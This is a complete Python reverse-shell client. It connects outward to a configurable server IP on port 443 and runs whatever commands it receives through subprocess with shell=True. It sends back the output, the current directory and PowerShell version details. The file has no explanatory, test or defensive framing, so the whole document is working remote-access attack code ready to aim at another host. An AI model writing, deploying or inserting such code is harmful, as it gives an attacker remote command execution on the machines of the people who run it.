import socket
import subprocess

# Configuration
SERVER_IP = '127.0.0.1'
PORT = 443

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, PORT))
    print("[+] Connected to the server.")
    
    # Fetch initial directory
    while True:
        try:
            # Receive command from the server
            command = client.recv(1024).decode().strip()
            
            # Exit if server sends "exit"
            if command.lower() == "exit":
                break
            
            # Check for shell detection command (PowerShell or CMD)
            if command == "cd":
                # Determine current directory
                current_dir = subprocess.check_output("cd", shell=True).decode().strip()
                client.send(current_dir.encode())
                continue

            # Check for PowerShell version
            if command == "$PSVersionTable.PSVersion":
                try:
                    version_info = subprocess.check_output(["powershell", "-Command", "$PSVersionTable.PSVersion"], text=True)
                    client.send(version_info.encode())
                except subprocess.CalledProcessError:
                    client.send("Not PowerShell".encode())
                continue

            # Execute other commands and return output
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
            client.send(result.encode())
        
        except Exception as e:
            error_message = f"[!] Error: {str(e)}"
            client.send(error_message.encode())
            break

    client.close()
    print("[+] Client connection closed.")

if __name__ == "__main__":
    connect_to_server()
